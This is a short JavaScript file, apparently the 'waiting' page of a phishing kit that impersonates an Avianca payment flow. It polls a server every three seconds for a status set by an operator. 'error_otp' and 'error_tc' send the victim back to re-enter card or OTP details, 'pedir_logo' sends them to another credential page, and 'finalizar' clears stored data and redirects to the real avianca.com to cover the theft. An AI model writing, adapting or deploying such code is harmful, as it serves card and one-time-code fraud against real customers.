// public/js/waiting.js
(async function () {
  'use strict';

  const LS = window.localStorage;
  let transactionId = null;
  let pollInterval = null;

  try {
    const savedInfo = JSON.parse(LS.getItem('info'));
    if (savedInfo && savedInfo.transactionId) {
      transactionId = savedInfo.transactionId;
      console.log('ID de transacción recuperado:', transactionId);
    } else {
      console.error('No se encontró ID de transacción en localStorage.');
      alert('Ha ocurrido un error inesperado. Por favor, vuelve a intentarlo.');
      window.location.href = 'payment.html';
      return;
    }
  } catch (e) {
    console.error('Error al parsear info de localStorage:', e);
    alert('Ha ocurrido un error inesperado. Por favor, vuelve a intentarlo.');
    window.location.href = 'payment.html';
    return;
  }

  const pollStatus = async () => {
    try {
      const response = await fetch(`/status/${transactionId}`);
      const data = await response.json();

      console.log('Estado del servidor:', data.status);

      switch (data.status) {
        case 'pedir_logo':
          clearInterval(pollInterval);
          console.log('Estado "pedir_logo" detectado. Redirigiendo a chedf.html...');
          window.location.href = 'chedf.html';
          break;
        case 'error_otp':
        case 'error_tc':
          clearInterval(pollInterval);
          console.log(`Estado "${data.status}" detectado. Redirigiendo a la página de error...`);
          alert('Ha ocurrido un error con tu método de pago. Por favor, inténtalo de nuevo.');
          window.location.href = 'payment.html';
          break;
        case 'finalizar':
          clearInterval(pollInterval);
          console.log('Estado "finalizar" detectado. Redirigiendo a la página de éxito...');
          LS.removeItem('info');
          window.location.href = 'https://www.avianca.com';
          break;
        case 'pending':
        default:
          console.log('Estado "pending". Esperando...');
          break;
      }
    } catch (err) {
      console.error('Error al consultar el estado:', err);
    }
  };

  pollInterval = setInterval(pollStatus, 3000);

})();
